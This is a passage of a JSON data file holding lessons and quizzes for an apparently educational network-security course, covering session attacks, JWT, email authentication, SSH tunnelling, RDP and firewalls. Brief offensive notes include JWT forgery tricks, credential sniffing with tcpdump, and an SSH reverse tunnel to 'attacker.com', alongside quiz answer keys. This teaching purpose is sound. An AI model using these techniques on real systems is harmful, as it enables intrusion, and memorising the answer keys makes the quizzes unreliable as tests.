        "title": "Session Attacks: Hijacking, Fixation, & CSRF",
        "summary": "How session identifiers are stolen, pre-set, or forged in user browsers.",
        "concept": "- Session Hijacking: Attacker acquires valid session token (via XSS, network sniffing, or log leakage) and inserts it into their own browser to impersonate victim.\n- Session Fixation: Attacker tricks victim into authenticating using a known session ID pre-set by the attacker (e.g. via URL parameter `?SID=ATTACKER_ID`). Once victim logs in, the attacker accesses the account using that same ID!\n- Cross-Site Request Forgery (CSRF): Malicious site tricks victim's browser into submitting an unauthorized state-changing request (e.g. `/transfer?amount=1000`) to an authenticated bank site because the browser automatically attaches stored cookies.",
        "cyberLens": {
          "offensive": "Session Fixation is devastating on legacy PHP apps that do not regenerate session identifiers upon successful login.",
          "defensive": "Session Regeneration: The application MUST regenerate a brand-new random session ID immediately upon successful user authentication (`session_regenerate_id(true)` in PHP), invalidating the old anonymous pre-login token."
        },
        "keyPoints": [
          "Always regenerate session IDs upon login and privilege escalation.",
          "Anti-CSRF tokens (unique, unpredictable tokens per form) defeat CSRF.",
          "Implement idle and absolute session expiration timeouts."
        ],
        "quiz": {
          "question": "How does a web application effectively eliminate the Session Fixation attack vulnerability?",
          "options": [
            "By making passwords longer.",
            "By immediately generating a brand-new, random session ID and discarding the old one as soon as the user logs in successfully.",
            "By disabling HTTPS.",
            "By allowing users to choose their own session ID numbers."
          ],
          "answer": 1,
          "explanation": "Session fixation relies on the pre-login session ID remaining valid after authentication. Regenerating the session ID upon login immediately invalidates the attacker's pre-set token."
        }
      },
      {
        "screenNumber": 4,
        "globalSource": 92,
        "title": "JSON Web Tokens (JWT) vs Stateful Sessions",
        "summary": "Header.Payload.Signature: Stateless tokens, cryptographic signing, and common JWT flaws.",
        "concept": "Modern single-page applications (React, Angular) and microservices often use stateless JSON Web Tokens (JWT):\n- Structure: `Header.Payload.Signature` (Base64URL encoded).\n  - Header: Algorithm & token type (`{\"alg\": \"HS256\", \"typ\": \"JWT\"}`).\n  - Payload: Claims (`{\"sub\": \"123\", \"username\": \"alice\", \"role\": \"user\"}`).\n  - Signature: `HMACSHA256(Base64(Header) + \".\" + Base64(Payload), SecretKey)`.\n- Stateless: The server does NOT store sessions in a database; it validates the cryptographic signature on each request.",
        "cyberLens": {
          "offensive": "JWT Vulnerabilities:\n1. `alg: none` exploit: Attacker sets algorithm to `none`, removes signature, and modifies payload to `role: admin`.\n2. Algorithm Confusion (RS256 to HS256): Attacker changes algorithm from asymmetric RSA to symmetric HMAC and signs the token using the server's public RSA key as the HMAC secret key!",
          "defensive": "Never trust the algorithm specified in the incoming token header; hardcode the required verification algorithm in server code."
        },
        "keyPoints": [
          "JWT payload is merely Base64 encoded, NOT encrypted (anyone can read it!).",
          "Signature guarantees integrity, not confidentiality.",
          "Revoking a stateless JWT before its expiration requires an explicit token blocklist."
        ],
        "quiz": {
          "question": "Can an eavesdropper read the contents of a standard JSON Web Token (JWT) transmitted over an unencrypted network?",
          "options": [
            "No, because JWTs are always encrypted with AES-256.",
            "Yes, because the JWT payload is only Base64URL-encoded (serialized), not encrypted.",
            "Only if they have the secret signing key.",
            "JWTs cannot be sent over networks."
          ],
          "answer": 1,
          "explanation": "A standard JWT is digitally signed, NOT encrypted. The payload is simply Base64-encoded JSON that anyone can decode and read at jwt.io."
        }
      }
    ]
  },
  {
    "id": "19",
    "module": "04 / SESSIONS & APPLICATION",
    "title": "L7: email protocols",
    "desc": "Follow mail delivery and separate sender claims from authentication checks.",
    "screensCount": 5,
    "sourceRange": "SOURCE 93-97",
    "simulator": "email-security-sim",
    "badge": "Email Authentication",
    "screens": [
      {
        "screenNumber": 1,
        "globalSource": 93,
        "title": "The Email Architecture: MUA, MTA, and Protocols",
        "summary": "How mail travels from sender to receiver: SMTP, POP3, and IMAP.",
        "concept": "Email delivery splits into two distinct operational halves:\n1. Push Protocol (Sending mail): Simple Mail Transfer Protocol (SMTP, RFC 5321).\n   - Port 25: Server-to-server relay.\n   - Port 587 (Submission with STARTTLS) / Port 465 (SMTPS): Client-to-server submission.\n2. Pull Protocols (Retrieving mail):\n   - POP3 (Post Office Protocol v3, Port 995 with TLS): Downloads messages to local device and deletes from server (single device workflow).\n   - IMAP (Internet Message Access Protocol, Port 993 with TLS): Syncs folders, flags, and messages across multiple devices (cloud standard).",
        "cyberLens": {
          "offensive": "Open Relays: Insecurely configured SMTP servers that accept and forward mail from any sender to any recipient without authentication are hijacked by spam botnets to blast phishing emails.",
          "defensive": "Close all open relays: SMTP servers must require authentication (SMTP-AUTH) for outbound relaying."
        },
        "keyPoints": [
          "SMTP sends; IMAP/POP3 retrieves.",
          "Port 25 is heavily blocked by residential ISPs to prevent spam botnets.",
          "IMAP synchronizes state across multiple phones and computers."
        ],
        "quiz": {
          "question": "Which protocol is used by an email client to push and send outgoing messages to a mail server?",
          "options": [
            "IMAP",
            "POP3",
            "SMTP (Simple Mail Transfer Protocol)",
            "HTTP"
          ],
          "answer": 2,
          "explanation": "SMTP is the standard protocol for sending/submitting email from client to server and relaying email between mail servers."
        }
      },
      {
        "screenNumber": 2,
        "globalSource": 94,
        "title": "The Anatomy of SMTP & The Spoofing Flaw",
        "summary": "Envelope From vs Header From: Why anyone can send email pretending to be the CEO.",
        "concept": "Designed in 1982, SMTP had ZERO built-in sender verification:\n- In an SMTP conversation, the client provides two separate sender identities:\n  1. Envelope Sender (`MAIL FROM: <attacker@evil.com>`): Used by mail servers for return-path bounce delivery.\n  2. Display Header (`From: \"CEO Name\" <ceo@company.com>`): What the human sees in Outlook or Gmail!\nBecause bare SMTP does not check whether the sender actually owns the domain in the `From:` header, anyone connecting to an open SMTP server can forge emails claiming to be from any person or organization in the world.",
        "cyberLens": {
          "offensive": "Business Email Compromise (BEC) & Spear Phishing: Attackers forge executive email addresses to order fraudulent wire transfers or request W-2 tax forms from HR.",
          "defensive": "Deploy the Email Authentication Triad: SPF, DKIM, and DMARC."
        },
        "keyPoints": [
          "The human sees the Header From; the server routes via Envelope From.",
          "Legacy SMTP does not authenticate the sender's identity.",
          "Phishing and BEC attacks thrive on this fundamental protocol limitation."
        ],
        "quiz": {
          "question": "Why could any user historically send an email pretending to be ceo@apple.com using raw SMTP commands?",
          "options": [
            "Because Apple did not have an email server.",
            "Because the original SMTP protocol specification has no mechanism to verify that the sending IP address is authorized to use the domain in the 'From:' header.",
            "Because emails are sent over Wi-Fi.",
            "Because SMTP is an encrypted protocol."
          ],
          "answer": 1,
          "explanation": "Original SMTP relies entirely on the client telling the truth. The server simply accepted whatever address was typed into `MAIL FROM` and `From:`."
        }
      },
      {
        "screenNumber": 3,
        "globalSource": 95,
        "title": "Sender Policy Framework (SPF)",
        "summary": "Authorizing sending IP addresses via DNS TXT records.",
        "concept": "SPF (RFC 7208) allows a domain owner to publish a list of IP addresses authorized to send email for their domain in a DNS TXT record:\n`v=spf1 ip4:198.51.100.0/24 include:_spf.google.com ~all`\nMechanics:\n1. Receiving mail server inspects the Envelope `MAIL FROM` domain.\n2. Queries DNS TXT record for that domain's SPF record.\n3. Checks if sending server's IP address is in the list.\nQualifiers:\n- `+` Pass (authorized)\n- `-` Fail / HardFail (unauthorized, reject)\n- `~` SoftFail (unauthorized, mark as spam/quarantine)\n- `?` Neutral\nSPF Limitation: SPF validates ONLY the Envelope From (`Return-Path`), NOT the Header From displayed to the user!",
        "cyberLens": {
          "offensive": "SPF Bypass via Header Mismatch: Attacker sets Envelope `MAIL FROM: attacker@evil.com` (which passes SPF on `evil.com`), but sets Header `From: boss@target.com`! Naive mail filters passing SPF on the envelope display the spoofed boss address.",
          "defensive": "DMARC solves this limitation by enforcing alignment between the SPF domain and the visible Header From domain."
        },
        "keyPoints": [
          "SPF lists authorized IP addresses in DNS.",
          "SPF has a maximum limit of 10 DNS lookups to prevent DoS.",
          "SPF alone does NOT protect the visible 'From:' header."
        ],
        "quiz": {
          "question": "What is the key limitation of SPF that allows attackers to still spoof visible sender names in email clients?",
          "options": [
            "SPF does not work with Gmail.",
            "SPF only validates the hidden Envelope Return-Path address, not the visible 'From:' header displayed to the human user.",
            "SPF requires fiber cables.",
            "SPF records can only be 4 letters long."
          ],
          "answer": 1,
          "explanation": "SPF checks the sender IP against the domain in the RFC 5321 Return-Path (envelope). An attacker can pass SPF using their own domain's envelope while forging the visible RFC 5322 'From:' header."
        }
      },
      {
        "screenNumber": 4,
        "globalSource": 96,
        "title": "DomainKeys Identified Mail (DKIM)",
        "summary": "Cryptographically signing email headers and bodies with public-key cryptography.",
        "concept": "DKIM (RFC 6376) proves an email was not tampered with in transit and genuinely originated from the claimed domain:\n1. Sending server computes cryptographic hash of email body and selected headers.\n2. Signs hash using its private key, attaching the signature in a `DKIM-Signature:` header:\n   `DKIM-Signature: v=1; a=rsa-sha256; d=example.com; s=selector1; b=a7f9...`\n3. Receiving mail server extracts domain `d=` and selector `s=`.\n4. Queries DNS TXT record at `selector1._domainkey.example.com` to fetch the public key.\n5. Verifies signature against the message. If valid, authenticity and integrity are proven!",
        "cyberLens": {
          "offensive": "DKIM Replay Attacks: If a DKIM signature does not sign the `Date` or `To` headers, an attacker who intercepts a legitimate signed email can replay (forward) it to millions of targets without breaking the signature.",
          "defensive": "Oversign critical headers (Subject, From, To, Date) in DKIM configuration to prevent header modification or replay manipulation."
        },
        "keyPoints": [
          "DKIM provides cryptographic non-repudiation and tamper-proofing.",
          "Private key stays on the mail server; public key is published in DNS.",
          "Email surviving mailing lists often breaks SPF, but survives DKIM."
        ],
        "quiz": {
          "question": "Where does a receiving mail server fetch the public key required to verify a DKIM cryptographic signature?",
          "options": [
            "From an attachment in the email.",
            "From a DNS TXT record published under selector._domainkey.domain.com.",
            "From the user's hard drive.",
            "From the router's ARP table."
          ],
          "answer": 1,
          "explanation": "The receiving server extracts the selector (s=) and domain (d=) from the DKIM-Signature header and queries DNS for the public key stored at `<selector>._domainkey.<domain>`."
        }
      },
      {
        "screenNumber": 5,
        "globalSource": 97,
        "title": "DMARC: The Ultimate Policy & Enforcement Layer",
        "summary": "Domain-based Message Authentication, Reporting, and Conformance: Alignment and Reject policies.",
        "concept": "DMARC (RFC 7489) ties SPF and DKIM together to protect the visible `From:` header:\n1. Identifier Alignment: Enforces that the domain in the visible `From:` header matches the domain authenticated by SPF and/or DKIM.\n2. Policy Action (`p=` in DNS TXT record at `_dmarc.example.com`):\n   - `p=none`: Monitor only (collect feedback reports, don't block).\n   - `p=quarantine`: Send failed emails to Spam / Junk folder.\n   - `p=reject`: Completely drop/reject unauthorized emails at the gateway!\n3. Reporting: Receiving servers send automated XML aggregate reports (`rua=`) back to the domain owner detailing who is sending email on their behalf.",
        "cyberLens": {
          "offensive": "Domains with `p=none` or missing DMARC records can be spoofed directly to execute executive phishing with 100% inbox delivery.",
          "defensive": "Organizations must move DMARC policy from `p=none` -> `p=quarantine` -> `p=reject` to completely neutralize spoofing of their brand."
        },
        "keyPoints": [
          "DMARC requires either SPF or DKIM to align with the visible From header.",
          "Only `p=reject` provides definitive protection against email spoofing.",
          "`_dmarc.domain.com` TXT record defines the global policy."
        ],
        "quiz": {
          "question": "What DMARC policy setting actively commands receiving mail servers to drop and reject all unauthenticated spoofed emails pretending to come from your domain?",
          "options": [
            "p=none",
            "p=quarantine",
            "p=reject",
            "p=allow"
          ],
          "answer": 2,
          "explanation": "`p=reject` is the highest level of DMARC enforcement. Mail servers receiving emails that fail DMARC alignment will reject and delete them immediately."
        }
      }
    ]
  },
  {
    "id": "20",
    "module": "04 / SESSIONS & APPLICATION",
    "title": "L7: remote access & file transfer",
    "desc": "Compare remote shells, tunnels, file transfer, and management exposure.",
    "screensCount": 5,
    "sourceRange": "SOURCE 98-102",
    "simulator": "remote-access-sniffer",
    "badge": "Remote Management",
    "screens": [
      {
        "screenNumber": 1,
        "globalSource": 98,
        "title": "Telnet vs Secure Shell (SSH)",
        "summary": "Cleartext ASCII terminals vs cryptographically authenticated encrypted channels.",
        "concept": "- Telnet (Port 23): Developed in 1969. Sends all keystrokes, passwords, and shell output in cleartext over TCP. Anyone sniffing the network (Wireshark) sees root credentials in plaintext.\n- SSH (Secure Shell, Port 22): Provides encrypted remote shell, file transfer, and port forwarding.\n  - Key Exchange: Diffie-Hellman negotiates shared session key.\n  - Host Key Verification: Server presents host key; client checks against `~/.ssh/known_hosts` (defeats MITM).\n  - User Authentication: Passwords, Public Key authentication (Ed25519/RSA), or Hardware Security Keys (FIDO2).",
        "cyberLens": {
          "offensive": "Legacy Sniffing: If network switches or IoT devices use Telnet, attackers use `tcpdump -A 'port 23'` to harvest administrative credentials as engineers log in.\nSSH Brute-Force: Attackers run automated password sprayers (Hydra) against port 22.",
          "defensive": "Disable Telnet universally. On SSH, disable password authentication (`PasswordAuthentication no`) and disable root login (`PermitRootLogin no`), enforcing Ed25519 public keys."
        },
        "keyPoints": [
          "Telnet sends raw passwords in plaintext; never use it.",
          "SSH uses public keys and known_hosts to prevent MITM attacks.",
          "Ed25519 is the modern recommended cryptographic algorithm for SSH keys."
        ],
        "quiz": {
          "question": "What is the purpose of the ~/.ssh/known_hosts file on an SSH client machine?",
          "options": [
            "It stores user passwords in plaintext.",
            "It records the cryptographic public host keys of remote servers you have connected to, warning you if the server's key changes (detecting MITM attacks).",
            "It lists favorite websites.",
            "It speeds up file downloads."
          ],
          "answer": 1,
          "explanation": "`known_hosts` caches the remote server's public key fingerprint on first connection. If an attacker executes a MITM attack, the key mismatch triggers the famous 'WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!'."
        }
      },
      {
        "screenNumber": 2,
        "globalSource": 99,
        "title": "SSH Port Forwarding & Pivoting",
        "summary": "Local port forwarding, Remote reverse tunnels, and Dynamic SOCKS proxies.",
        "concept": "SSH can encapsulate arbitrary TCP traffic inside its encrypted tunnel:\n1. Local Port Forwarding (`ssh -L 8080:internal.db:3306 user@bastion`):\n   - Client opens local port 8080. Traffic sent to `localhost:8080` is encrypted through bastion and forwarded to internal database on 3306.\n2. Remote / Reverse Port Forwarding (`ssh -R 9001:localhost:22 user@attacker.com`):\n   - Server on Internet opens port 9001. Traffic to server:9001 tunnels back to target's internal SSH port 22 (bypasses inbound firewalls and NAT!).\n3. Dynamic Port Forwarding (`ssh -D 1080 user@bastion`):\n   - Turns SSH client into a local SOCKS5 proxy, routing all browser/Nmap traffic through the bastion host.",
        "cyberLens": {
          "offensive": "Pivoting & C2 Egress: Attackers who compromise an internal workstation use SSH reverse tunnels or dynamic SOCKS proxies (`proxychains`) to pivot laterally through the entire internal enterprise network.",
          "defensive": "Restrict SSH tunneling on jump hosts by setting `AllowTcpForwarding no` and `PermitOpen` restrictions in `/etc/ssh/sshd_config`."
        },
        "keyPoints": [
          "-L tunnels local out to remote.",
          "-R punches reverse tunnels out from behind firewalls.",
          "-D creates a versatile SOCKS5 proxy for tunneling tools."
        ],
        "quiz": {
          "question": "Which SSH command creates a local SOCKS5 proxy on port 1080, allowing you to route any tool's traffic through the remote server?",
          "options": [
            "ssh -L 80:remote:80 user@server",
            "ssh -D 1080 user@server",
            "ssh -R 1080:localhost:80 user@server",
            "ssh -X user@server"
          ],
          "answer": 1,
          "explanation": "The `-D` flag (Dynamic port forwarding) allocates a SOCKS listener on the local port (e.g. 1080), dynamically forwarding any application traffic configured to use the proxy."
        }
      },
      {
        "screenNumber": 3,
        "globalSource": 100,
        "title": "File Transfer Protocols: FTP vs FTPS vs SFTP",
        "summary": "Understanding the massive confusion between three completely different protocols.",
        "concept": "1. FTP (File Transfer Protocol, RFC 959):\n   - Insecure cleartext. Uses TWO separate connections: Control (Port 21) and Data (Port 20 in Active mode, or random dynamic port in Passive mode). Breaks easily across firewalls.\n2. FTPS (FTP Secure / FTP-SSL):\n   - The legacy FTP protocol wrapped inside a TLS encryption tunnel. Still uses two separate connections.\n3. SFTP (SSH File Transfer Protocol):\n   - COMPLETELY UNRELATED TO FTP! It is an extension of the SSH protocol running entirely over a single encrypted SSH connection (Port 22).",
        "cyberLens": {
          "offensive": "FTP Credential Sniffing: Attackers capture cleartext `USER` and `PASS` commands over FTP. In Active FTP, the server connects back to the client, which attackers exploit in FTP Bounce Attacks to scan internal ports.",
          "defensive": "Decommission legacy FTP servers; migrate all automated file transfer workflows to SFTP with SSH key authentication."
        },
        "keyPoints": [
          "FTP uses 2 connections (Control and Data); SFTP uses 1 connection (SSH).",
          "SFTP and FTPS are completely different protocols.",
          "Standard FTP sends credentials and files completely unencrypted."
        ],
        "quiz": {
          "question": "What is the fundamental architectural difference between SFTP and FTPS?",
          "options": [
            "SFTP runs over SSH (Port 22) on a single channel, whereas FTPS is legacy FTP wrapped in TLS using dual control/data connections.",
            "SFTP does not use encryption.",
            "FTPS is only used on Mac computers.",
            "They are identical protocols with different names."
          ],
          "answer": 0,
          "explanation": "SFTP is an SSH subsystem running on port 22. FTPS is the old multi-port FTP protocol running over TLS (ports 21/990)."
        }
      },
      {
        "screenNumber": 4,
        "globalSource": 101,
        "title": "Remote Desktop Protocol (RDP) & VNC",
        "summary": "Port 3389, Network Level Authentication (NLA), and critical CVE vulnerabilities.",
        "concept": "- RDP (Remote Desktop Protocol, Port 3389): Proprietary Microsoft protocol for graphical remote Windows desktop sessions.\n  - Uses TLS encryption.\n  - Network Level Authentication (NLA): Requires the user to authenticate credentials against CredSSP BEFORE the full RDP graphical session and TLS handshake is initiated.\n- VNC (Virtual Network Computing, Port 5900): RFB protocol; historically unencrypted and restricted to 8-character passwords.",
        "cyberLens": {
          "offensive": "RDP Exposure Exploits: Exposed RDP on the public Internet is the #1 vector for ransomware initial access (via brute force). Critical vulnerabilities like BlueKeep (CVE-2019-0708) allow pre-authentication Remote Code Execution (RCE) on systems without NLA!",
          "defensive": "NEVER expose port 3389 directly to the public Internet. Enforce NLA, require MFA via VPN / Cloudflare Access, and limit login attempts."
        },
        "keyPoints": [
          "RDP runs on port 3389; VNC runs on port 5900.",
          "Network Level Authentication (NLA) prevents pre-auth exploits like BlueKeep.",
          "Ransomware gangs scan continuously for exposed RDP endpoints."
        ],
        "quiz": {
          "question": "Why is enabling Network Level Authentication (NLA) essential for securing Windows RDP servers?",
          "options": [
            "It increases screen resolution.",
            "It forces the client to prove valid Windows credentials before the RDP server spawns a full session or processes complex graphic subroutines, neutralizing pre-auth exploits like BlueKeep.",
            "It turns off passwords.",
            "It converts RDP into SSH."
          ],
          "answer": 1,
          "explanation": "Without NLA, anyone connecting to port 3389 can reach vulnerable Windows kernel graphics drivers before logging in. NLA requires successful credential authentication first, stopping unauthenticated exploits."
        }
      },
      {
        "screenNumber": 5,
        "globalSource": 102,
        "title": "Management Surface Exposure & Bastion Architecture",
        "summary": "Zero-exposure principles, Jump Boxes, and Identity-Aware Proxies.",
        "concept": "Exposing internal management interfaces (SSH, RDP, Web Admin consoles, IPMI) directly to public IP addresses is the leading cause of enterprise breaches.\nModern Architecture:\n1. Bastion Host / Jump Box: A hardened, minimal Linux/Windows server placed in an isolated management DMZ. All administrators must SSH/RDP into the jump box using MFA before accessing internal servers.\n2. Identity-Aware Proxy (IAP) / Zero Trust Network Access (ZTNA): Cloudflare Tunnel, AWS Systems Manager (SSM), or Google IAP.\n   - No inbound firewall ports are opened anywhere!\n   - An outbound agent connects to the cloud proxy, authenticating users via SAML/OIDC and SSO with MFA before proxying SSH/RDP.",
        "cyberLens": {
          "offensive": "Shodan & Censys Scanning: Attackers search Shodan for exposed IPMI/iLO server management cards or unauthenticated Kubernetes API dashboards (port 6443) to seize bare-metal hardware control.",
          "defensive": "Isolate all management traffic to a dedicated out-of-band (OOB) management network inaccessible from both the Internet and standard user workstations."
        },
        "keyPoints": [
          "Zero open inbound management ports is the gold standard.",
          "Bastion hosts enforce multi-factor authentication and session audit recording.",
          "ZTNA proxies eliminate the need for traditional corporate VPNs."
        ],
        "quiz": {
          "question": "What is the primary security advantage of an Identity-Aware Proxy (e.g. AWS SSM or Cloudflare Tunnel) over a traditional open SSH port?",
          "options": [
            "It requires zero inbound open firewall ports on the target machine, eliminating public IP port scanning and brute-force attacks.",
            "It makes internet connections 10 times faster.",
            "It eliminates the need for passwords.",
            "It converts Linux into Windows."
          ],
          "answer": 0,
          "explanation": "With an outbound tunnel/agent, the server opens NO listening ports to the public Internet, rendering it completely invisible to Shodan and automated vulnerability scanners."
        }
      }
    ]
  },
  {
    "id": "21",
    "module": "05 / ENTERPRISE & DEFENCE",
    "title": "Infrastructure & what comes next",
    "desc": "Meet enterprise protocols and the policy questions that survive changing tools.",
    "screensCount": 4,
    "sourceRange": "SOURCE 103-106",
    "simulator": "enterprise-arch-sim",
    "badge": "Enterprise Core",
    "screens": [
      {
        "screenNumber": 1,
        "globalSource": 103,
        "title": "The Cisco 3-Tier Hierarchical Model",
        "summary": "Core, Distribution, and Access layers: predictable scaling and fault isolation.",
        "concept": "Enterprise campus networks traditionally follow a structured 3-tier hierarchy:\n1. Core Layer: High-speed packet switching backbone (no packet filtering or QoS overhead; pure raw forwarding speed).\n2. Distribution / Aggregation Layer: Enforces routing policies, VLAN routing, Access Control Lists (ACLs), security filtering, and QoS boundaries.\n3. Access Layer: User switch ports where workstations, APs, and printers connect. Enforces port security, 802.1X, and PoE.",
        "cyberLens": {
          "offensive": "Lateral Movement Choke Points: Attackers navigating between departmental VLANs must traverse the Distribution layer, where inter-VLAN ACLs and NetFlow telemetry can catch them.",
          "defensive": "Enforce microsegmentation policies at the Distribution layer so finance, HR, and engineering subnets cannot communicate without explicit firewall authorization."
        },
        "keyPoints": [
          "Access layer connects users; Distribution layer enforces security; Core layer routes fast.",
          "Modularity prevents local switch failures from cascading across the enterprise.",
          "Modern data centers adapt this into 2-tier Spine-Leaf architecture."
        ],
        "quiz": {
          "question": "At which layer of the Cisco 3-tier hierarchical network model are Access Control Lists (ACLs) and inter-VLAN routing security policies typically enforced?",
          "options": [
            "Core Layer",
            "Distribution Layer",
            "Access Layer",
            "Physical Cable Layer"
          ],
          "answer": 1,
          "explanation": "The Distribution layer aggregates access switches and terminates VLAN boundaries, making it the ideal location to enforce routing policies, security filtering, and ACLs."
        }
      },
      {
        "screenNumber": 2,
        "globalSource": 104,
        "title": "Virtual Private Networks (VPNs): IPsec vs SSL/TLS",
        "summary": "Site-to-Site vs Remote Access, Tunnel mode vs Transport mode, and ESP/AH.",
        "concept": "VPNs create encrypted tunnels across untrusted public networks:\n1. IPsec (Layer 3 VPN):\n   - Protocols: Authentication Header (AH, integrity only) and Encapsulating Security Payload (ESP, encryption + integrity).\n   - Modes: Transport Mode (encrypts only payload; IP headers visible) vs Tunnel Mode (encrypts entire original IP packet and wraps inside a new outer IP header; standard for Site-to-Site).\n   - IKEv2 (Internet Key Exchange) negotiates Security Associations (SA).\n2. SSL/TLS VPNs (OpenVPN, WireGuard, AnyConnect):\n   - Operates on Layer 4/7 (TCP/UDP 443).\n   - Ideal for remote user access because port 443 traverses all hotel/airport firewalls easily.",
        "cyberLens": {
          "offensive": "VPN Portal Exploitation: Unpatched enterprise SSL-VPN appliances (Pulse Secure, Fortinet, Palo Alto CVEs) are the most frequent initial access vector for nation-state advanced persistent threats (APTs).",
          "defensive": "Mandate Multi-Factor Authentication (MFA) on all VPN accounts; never expose legacy PPTP or unpatched VPN firmware."
        },
        "keyPoints": [
          "Site-to-site connects office networks; remote access connects remote employees.",
          "IPsec Tunnel Mode hides internal IP addresses inside a new outer IP header.",
          "WireGuard is the modern, fast, auditable alternative to legacy IPsec and OpenVPN."
        ],
        "quiz": {
          "question": "What is the primary difference between IPsec Tunnel Mode and IPsec Transport Mode?",
          "options": [
            "Tunnel Mode encrypts the entire original IP packet and adds a brand-new outer IP header; Transport Mode only encrypts the payload, keeping original IP headers intact.",
            "Transport Mode is only used on trains.",
            "Tunnel Mode does not use encryption.",
            "They are identical."
          ],
          "answer": 0,
          "explanation": "In Tunnel Mode (used in Site-to-Site VPNs), the entire original internal IP packet is encrypted and placed inside a new routable outer IP packet, hiding internal source and destination IPs."
        }
      },
      {
        "screenNumber": 3,
        "globalSource": 105,
        "title": "Network Management: SNMP, Syslog, & NTP",
        "summary": "The control plane protocols that monitor, log, and synchronize enterprise devices.",
        "concept": "- SNMP (Simple Network Management Protocol, UDP 161/162):\n  - Queries network device health and bandwidth via Management Information Bases (MIBs).\n  - SNMPv1/v2c: Insecure! Transmits plaintext 'Community Strings' (e.g. `public` or `private`).\n  - SNMPv3: Adds DES/AES encryption and user authentication (USM).\n- Syslog (UDP 514): Standard event logging from network hardware to centralized SIEM servers.\n- NTP (Network Time Protocol, UDP 123): Synchronizes millisecond clocks across all servers and firewalls (vital for legal incident response forensic timeline correlation).",
        "cyberLens": {
          "offensive": "SNMP Community String Harvesting: Attackers probe for `public` (read-only) or `private` (read-write). Read access dumps network interfaces, routing tables, and device usernames. Read-write access allows rewriting router configs!",
          "defensive": "Disable SNMPv1/v2c completely; enforce SNMPv3 with SHA authentication and AES encryption."
        },
        "keyPoints": [
          "SNMPv1/v2c community strings are passwords in plaintext.",
          "Without accurate NTP time synchronization, digital forensics timelines fall apart in court.",
          "Syslog must be transmitted over TLS (RFC 5425) to prevent tampering."
        ],
        "quiz": {
          "question": "Why is the use of SNMP version 1 and version 2c strictly prohibited in high-security environments?",
          "options": [
            "Because they only work on dial-up modems.",
            "Because they transmit authentication passwords (community strings) in unencrypted cleartext across the network.",
            "Because SNMP cannot monitor CPU temperature.",
            "Because SNMP requires Linux."
          ],
          "answer": 1,
          "explanation": "SNMPv1 and v2c send community strings in plaintext. Anyone sniffing the network can capture the string and access full internal hardware configurations."
        }
      },
      {
        "screenNumber": 4,
        "globalSource": 106,
        "title": "Software-Defined Networking (SDN) & Cloud Overlays",
        "summary": "Decoupling the control plane from the data plane: OpenFlow, VXLAN, and Cloud VPCs.",
        "concept": "Traditional routers combine the Control Plane (calculating routes) and Data Plane (forwarding packets) inside every individual physical box.\nSoftware-Defined Networking (SDN) separates them:\n- Control Plane is centralized in a software controller (e.g. OpenFlow, Cisco ACI, VMware NSX).\n- Data Plane consists of dumb, high-speed forwarding switches executing flow rules pushed down by the controller.\n- VXLAN (Virtual Extensible LAN, UDP 4789): Overlays Layer 2 Ethernet frames inside Layer 3 UDP packets, expanding VLAN limits from 4,096 to 16 million virtual networks across cloud datacenters (AWS VPCs).",
        "cyberLens": {
          "offensive": "SDN Controller Compromise: If an attacker compromises the central SDN controller API, they gain programmatic control over the entire enterprise forwarding fabric, capable of silently mirroring all enterprise traffic.",
          "defensive": "Harden SDN controller REST APIs with strict mutual TLS (mTLS), RBAC, and dedicated out-of-band management subnets."
        },
        "keyPoints": [
          "SDN centralizes routing logic in software controllers.",
          "VXLAN powers modern cloud multitenancy (AWS VPC / Azure VNet).",
          "Programmable networks allow automated security quarantine of compromised hosts in seconds."
        ],
        "quiz": {
          "question": "What core separation defines Software-Defined Networking (SDN)?",
          "options": [
            "Separating keyboards from monitors.",
            "Decoupling the centralized Control Plane (routing decision logic) from the distributed Data Plane (packet forwarding hardware).",
            "Splitting IPv4 into IPv2.",
            "Disabling fiber optic cables."
          ],
          "answer": 1,
          "explanation": "SDN removes route calculation from individual switches (Control Plane) and centralizes it in an intelligent software controller, while switches simply execute fast packet forwarding (Data Plane)."
        }
      }
    ]
  },
  {
    "id": "22",
    "module": "05 / ENTERPRISE & DEFENCE",
    "title": "Network defence",
    "desc": "Compare firewalls, IDS, IPS, and tunnel visibility.",
    "screensCount": 4,
    "sourceRange": "SOURCE 107-110",
    "simulator": "firewall-ids-sim",
    "badge": "Active Defense",
    "screens": [
      {
        "screenNumber": 1,
        "globalSource": 107,
        "title": "Firewall Evolution: Packet Filters to NGFW",
        "summary": "1st Gen Stateless, 2nd Gen Stateful, 3rd Gen Application, and Next-Generation Firewalls.",
        "concept": "- 1st Gen (Stateless Packet Filter): Evaluates individual packets against static IP/Port rules. Easily tricked by forged ACK flags.\n- 2nd Gen (Stateful Inspection): Maintains connection state tables. Validates handshakes and permits return traffic automatically.\n- 3rd Gen (Application Proxy): Terminates connections and inspects full application payload.\n- Next-Gen Firewall (NGFW): Integrates stateful inspection, Deep Packet Inspection (DPI), Application Identification (App-ID, e.g. allowing Facebook chat but blocking file upload), User-ID (Active Directory user mapping), TLS decryption, and real-time threat intelligence feeds.",
        "cyberLens": {
          "offensive": "Protocol Tunneling & Port Hopping: Malware runs command-and-control over standard port 80 or 443 using non-HTTP protocols. Traditional firewalls allow it because port 80 is open; NGFWs detect non-HTTP payloads and block them.",
          "defensive": "Deploy App-ID policies that require traffic on port 443 to strictly conform to valid SSL/TLS and HTTP specifications."
        },
        "keyPoints": [
          "Stateless looks at packets in isolation; stateful tracks connections.",
          "NGFW identifies applications regardless of what port they run on.",
          "Default-deny rule must always sit at the bottom of every firewall policy."
        ],
        "quiz": {
          "question": "How does a Next-Generation Firewall (NGFW) with Application Identification (App-ID) defeat an attacker attempting to run an SSH shell over TCP port 80?",
          "options": [
            "It cannot detect it because port 80 is permitted.",
            "It inspects the payload protocol signatures and detects that the protocol is SSH rather than HTTP, blocking the session regardless of the port number used.",
            "It disconnects the user's monitor.",
            "It reboots the computer."
          ],
          "answer": 1,
          "explanation": "Traditional firewalls only check port numbers (80 = allow). An NGFW performs deep packet inspection on the payload: it recognizes the SSH protocol handshake and blocks it because it does not match approved HTTP traffic."
        }
      },
      {
        "screenNumber": 2,
        "globalSource": 108,
        "title": "IDS vs IPS: Detection vs Inline Prevention",
        "summary": "Promiscuous mode taps vs Inline bridges, Signature vs Anomaly analysis.",
